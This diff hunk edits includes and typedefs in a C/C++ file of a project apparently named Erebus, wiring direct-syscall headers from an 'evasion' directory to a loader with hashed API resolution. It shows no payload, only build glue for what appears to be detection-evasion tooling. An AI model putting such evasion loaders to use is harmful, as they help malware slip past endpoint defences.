@@ -3,8 +3,22 @@
 // under its #ifndef _WINTERNL_ guard. After Syscalls.h defines them, we set
 // _WINTERNL_ so loader.hpp skips its duplicate block. H() and the ImportModule/
 // ImportFunction macros live outside that block and are still available.
+// SE_SIGNING_LEVEL shim must land before Syscalls.h since it references the
+// typedef in function decls.
+#include "../../include/evasion/sw3/se_signing_level_shim.h"
 #include "../../include/evasion/sw3/Syscalls.h"
+// Suppress the winternl.h types (defined by Syscalls.h) and the Erebus-local
+// NT extension typedefs (SECTION_INHERIT / PS_ATTRIBUTE / PS_CREATE_STATE /
+// NT* function-pointer typedefs) that also live in Syscalls.h. This file
+// does not need them - only needs loader.hpp's H() macro, hash helpers, and
+// Get{Module,Proc}AddressC overloads.
 #define _WINTERNL_
+#define EREBUS_SKIP_NT_EXTENSIONS
+// loader.hpp declares GetTEB/GetPEB returning PTEB/PPEB past the extension
+// guard, so those aliases must exist. Syscalls.h ships its own SW3_PEB/TEB
+// structs and does not provide PTEB/PPEB - forward-declare here.
+struct _TEB; typedef struct _TEB* PTEB;
+struct _PEB; typedef struct _PEB* PPEB;
 #include "../../include/loader.hpp"
 #include "../../include/evasion/syscall_backend.hpp"
 
